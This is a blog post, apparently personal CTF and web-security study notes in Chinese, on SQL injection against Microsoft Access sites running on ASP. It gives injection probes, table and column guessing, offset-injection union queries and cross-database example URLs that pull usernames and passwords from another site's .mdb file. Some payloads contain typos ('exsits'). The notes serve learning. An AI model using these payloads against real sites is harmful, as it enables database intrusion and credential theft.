---
layout:     post
title:      Web笔记（二）SQL注入之Access
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是Access的SQL注入。
date:       2020-11-28
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - Access
---



## 0x00 Access数据库

access数据库是以文件的形式保存在本地的，后缀是\*.mdb（access2003版及以前）、*.accdb（access2007版）。

一般使用access数据库的网站是windows+iis+access+asp，也就是用windows操作系统、IIS中间件、Access数据库、asp后台语言搭建的网站。

access数据库没有库这个概念，一个access数据库文件就是相当于库，文件里可以有多张表，表中有多个列。



## 0x01 asp连接接access数据库

#### 1. \*.accdb文件连接方式

```asp
<%
"Driver={microsoft access driver(*.mdb)};dbq="*.mdb;uid=admin;pwd=pass;
dim conn
set conn = server.createobject("adodb.connection")
conn.open "provider=Microsoft.ACE.OLEDB.12.0;" & "data source = " & server.mappath("bbs.mdb")
%>
```
#### 2. \*.mdb文件连接方式

```asp
<%
    "Driver={microsoft access driver(*.mdb)};dbq="*.mdb;uid=admin;pwd=pass;
    dim conn
    set conn = server.createobject("adodb.connection")
    conn.open "provider=microsoft.jet.oledB.4.0;" & "data source = " & server.mappath("bbs.mdb")
%>
```



## 0x02 打开access的工具

常用打开工具

- Microsoft Access
- 辅臣数据库浏览器
- 破障浏览器



## 0x03 判断注入点和数据库

```
# 判断注入点
id=1 and 1=1		# 存在数值型注入
id=1' or '1'='1		# 存在字符型注入

# 判断数据库
id=1 and exsits (select * from msysobjects)>0		# 说明是access
id=1 and exsits (select * from sysobjects)>0		# 说明是sqlserver
```



## 0x04 判断数据库表

```
id=1 and exsits (select * from [表名])
# 示例：
id=1 and exsits (select * from admin)
```



## 0x05 判断数据库列名

```
id=1 and exsits (select [字段名] from [表名])
# 示例：
id=1 and exsits (select admin from admin)
```



## 0x06 注入工具

- 穿山甲（pangolin）

- sqlmap



## 0x07 偏移注入

#### 1. 一般思路

借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段显示在页面上，但运气很重要，不能保证100%成功。

解决知道Access数据库中知道表名，但是得不到字段的SQL注入困境。

偏移注入流程：

- 判断字段数`order by`
- 判断表名，使用`union select * from`表名来获取
- 开始偏移注入，利用注入公式来注入

**公式**：order by出的字段数减去\*号的字段数（如果\*号是原来17的位置，那这个字段数就是16），然后再用order by的字段数减去2倍刚才得出来的答案。

```
?id=688 union select 1,2,3,4,a.id,b.id,* from ([表名] as a inner join [表名] as b on a.id=b.id)
```

举例：

```
# 首先是
?id=1513+order+by+22
# 测试出是22字段数，然后
?id=1513+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+admin
# 逐渐减少，用*代替，直到测试正常
?id=1513+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,*+from+admin
# 可以计算22-16=6，22-6*2=10，所以
?id=1513+union+select+1,2,3,4,5,6,7,8,9,10,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id+b.id)
```

再举个例子

```
# 假设order by出的是18，*号有11个，那么就是18-11=7, 18-7*2=4，得到答案就是4。
?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id=b.id)
这里的union select 1,2,3,4就是刚才得出来的长度。
后面的sql语句也是套路来的。
```

#### 2. 其他思路

- 看后台登录文件源码表单里面的参数值。

- 看网站地址链接上的规则。
- 是否判断出对方使用的cms程序。 



## 0x08 垮裤查询

- 条件：同服务器下的站点有注入，知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来垮裤查询。

- 绝对路径：D:/wwwroot/...\*.mdb、\*.asa、\*.asp

- 举例：a是目标站点，b是存在注入的站点，a、b是同服务器的站点。

攻击链接示例如下，其中admin为表名，username、password为admin表的段。  

```
http://xxx.com/news/type.asp?id=1 and 1=2 union select 1,2,username,4,5,6 from [D:\wwwroot\1\Databases\xycms.mdb].admin

http://127.0.0.1:81/0/Production/PRODUCT_DETAIL.asp?id=-1 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from [D:\wwwroot\1\Databases\xycms.mdb].admin

http://127.0.0.1:99/0/Production/PRODUCT_DETAIL.asp?id=-1%20UNION%20SELECT%201,2,username,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22%20from%20admin_user%20in%20'C:\Users\Seven\Desktop|webpentest\1\xydata\xycms.mdb'
```